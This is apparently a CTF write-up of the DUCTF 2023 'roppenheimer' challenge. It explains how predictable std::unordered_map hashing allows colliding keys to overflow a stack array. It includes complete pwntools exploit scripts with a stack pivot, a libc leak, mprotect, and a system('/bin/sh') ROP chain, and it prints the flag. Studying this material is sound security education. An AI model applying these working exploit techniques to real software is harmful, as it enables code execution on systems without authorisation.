# ROPPENHEIMER
![meme](https://github.com/5kuuk/CTF-writeups/blob/main/ductf-2023/roppenheimer/meme.jpg)
## tl;dr
ROP via exploiting the [vulnerable default hash policy of unordered map](https://codeforces.com/blog/entry/62393)
## Overview
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Running the executable, we're first asked to input a name :
```
atomic research lab v0.0.1

name>
```
Then, we're presented with the following menu :
```
[1] add atom
[2] fire neutron
[3] quit
choice>
```
Let's focus on the important parts of the source code, which happened to be provided for this challenge !
### globals and macros

```C
#define MAX_ATOMS   32
#define MAX_COLLIDE 20
#define NAME_LEN    128

char username[NAME_LEN + 1];
std::unordered_map<unsigned int, uint64_t> atoms;
```
### main function
The name we input at the start is stored into the `username` global
```C
int main() {
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stdin, 0, 2, 0);
    atoms.clear();

    puts("atomic research lab v0.0.1");

    std::cout << std::endl << "name> ";
    fgets(username, NAME_LEN, stdin);
```
Then we get to the menu, note that we can only call `fire_neutron` once :
```C
    while (true) {
        int choice = get_choice();

        if (choice == 1) {
            add_atom();
        }
        if (choice == 2) {
            fire_neutron();
            quit();
        }
        if (choice == 3) {
            quit();
        }
    }

    return 0;
}
```
### add atom
An atom is essentially an `unsigned int` key associated to an `uint64_t` value.

We get to choose both, and then the (key,value) pair is added into the global `unordered map` `atoms`.

We are restricted to `32` elements.
```C
void add_atom() {
    if (atoms.size() >= MAX_ATOMS) {
        panic("atom capacity reached");
    }

    unsigned int atom;
    std::cout << "atom> ";
    std::cin >> atom;

    if (atoms.find(atom) != atoms.end()) {
        panic("atom already exists");
    }

    uint64_t data;
    std::cout << "data> ";
    std::cin >> data;

    atoms[atom] = data;
}
```
### fire neutron
This function is the most interesting, because it is vulnerable !

We choose an `atom` key, then all entries of `atoms` in the same bucket (i.e, whose key hashes the same) are copied into the `elems` list, which has only a capacity of 19 pairs !

That's a really nice primitive : if we get enough `atoms` keys to hash to the same value, then we can overflow `elems`, which is on the stack, and hijack control flow via ROP !

But hash collisions are notoriously hard to achieve on properly designed hash functions...
```C
void fire_neutron() {
    unsigned int atom;
    std::cout << "atom> ";
    std::cin >> atom;

    if (atoms.find(atom) == atoms.end()) {
        panic("atom does not exist");
    }

    size_t bucket = atoms.bucket(atom);
    size_t bucket_size = atoms.bucket_size(bucket);

    std::pair<unsigned int, uint64_t> elems[MAX_COLLIDE - 1];
    copy(atoms.begin(bucket), atoms.end(bucket), elems);

    std::cout << "[atoms hit]" << std::endl;
    for (size_t i = 0; i < bucket_size; i++) {
        std::cout << elems->first << std::endl;
    }
}
```
## Bad Hashing
You guessed it, and so did I during the ctf, the unordered map's default hashing has to be pretty terrible !

A quick google search later, I stumbled onto an [article](https://codeforces.com/blog/entry/62393) on codeforces, which explains how to exploit it.
Here's what I retained from it :
- `hash(k) = f(k) mod p` where `f` is some hash function and `p` is some prime
- by default, `f(k)=k` for some types, including `unsigned int`
- `p` is dependent on the unsorted map size, but is necessarily one of the primes in [`__prime_list`](https://github.com/gcc-mirror/gcc/blob/5bea0e90e58d971cf3e67f784a116d81a20b927a/libstdc%2B%2B-v3/src/shared/hashtable-aux.cc)

### Figuring out `p`
To figure out `p`, for each `q` in `__prime_list`, we add `32` elements, in `atoms`, such that each key is divisible by `q`, then fire a neuron on one of the `atoms`.
Note that I limited myself to `q` small enough for its multiples to be in `unsigned int` range.
For `p==q`, all atoms will be copied in `elems` whereas only one will be otherwise !
```python
primes = [...]

def prompt(m):
    io.sendlineafter(b"> ",m)

def prompti(i):
    prompt(str(i).encode())
N = 32
for p in primes:
    if (p < (2 ** 32-1)/N):
        io = start()
        prompt(b"skuuk")
        for i in range(N):
            prompt(b"1")
            prompt(str(i*p).encode())
            prompt(str(i).encode())
        prompt(b"2")
        prompt(str(p).encode())
        log.info(io.recvuntil(b"goodbye!\n"))
        io.close()
```
Using this procedure, I found that in our case `p==59` works.
Now, we know how to arrange `atoms` to oveflow `elems` !

By overflowing, we also overwrite `bucket_size` which determines the number of iterations of the loop in `fire_neuron`. I set it to `2` to avoid a very long sequence of prints 😆.

## Exploit
We are somewhat limited in our ability to ROP because we don't have a big overflow and the elements are arranged depending on the natural sort order of the keys, (and perhaps the order of insertions as well). I will spare you the details, tl;dr I decided to rely on a stack pivot to `username` as a result, and crafted all keys based on the address of `username` , so as to keep the ordering of `elems` fixed.

- This is the stack pivot I used :
```asm
pop rsp
pop rbp
ret
```
Thus, we need to start our rop chain in `username` by some value that will be popped into `rbp`.
Here
- We also have control over `rdi` thanks to this neat gadget :
```asm
pop rdi
pop rbp
ret
```
that we can leverage to leak libc using the `plt` and `got` entries of `puts`, as in a classic ret2libc attack
- We then return to main for some more exploitation 👀
```python
pop_rdi_rbp = 0x4025e0
pop_rsp_rbp = 0x404ac7
ret = 0x40201a
rop = [0,pop_rdi_rbp, exe.got.puts, 0, exe.plt.puts, exe.sym.main]

io = start()
prompt(b"".join([p64(g) for g in rop]))

good_prime = 59
offset = 0x409eac
for i in range(32):
    prompti(1)
    if i == 24:
        prompti(offset + good_prime*i)
        prompti(2)
    else:
        prompti(offset + good_prime*i)
        prompti(pop_rsp_rbp)
prompti(2)
prompti(offset)

l = io.recvuntil(b"research").split(b"atomic ")[0][-7:-1]
puts_addr = unpack(l,'all')
log.info(f"puts : 0x{puts_addr:x}")
libc = exe.libc
libc.address = puts_addr - libc.sym.puts
log.info((f"libc : 0x{libc.address:x}"))
```
- Once we go back to main and we provide a name, because of the pivoting, the `stack` still overlaps with `username`. This allows us to rop directly !
- Note that `system`  writes some data on the stack, and happens to reach a read-only page in our specific case
- To accomodate for it, I first returned to `mprotect` to set that memory page as `rwx` *(`rw` would have been enough)*
```C
pop_rdi = libc.address + 0x2a3e5
pop_rsi = libc.address + 0xda97d
pop_rdx_rbx = libc.address + 0x90529

m_addr = 0x409000
m_len = 0x1000
prot = 0x7
rop_mprotect = p64(pop_rdi) + p64(m_addr) + p64(pop_rsi) + p64(m_len) + p64(pop_rdx_rbx) + p64(prot)*2 + p64(libc.sym.mprotect)
rop2 = rop_mprotect + p64(pop_rdi_rbp) +p64(next(libc.search(b'/bin/sh\x00')))*2 + p64(ret) + p64(libc.sym.system)
prompt(b"a"*16 +rop2)
io.interactive()
```
## **FLAG**
```
DUCTF{wH0_KnEw_Th4T_HAsHm4ps_4nD_nUCle4r_Fi5S10n_HAd_s0meTHiNg_1n_c0MmoN}
```
A very good pun for a very cool challenge 👏



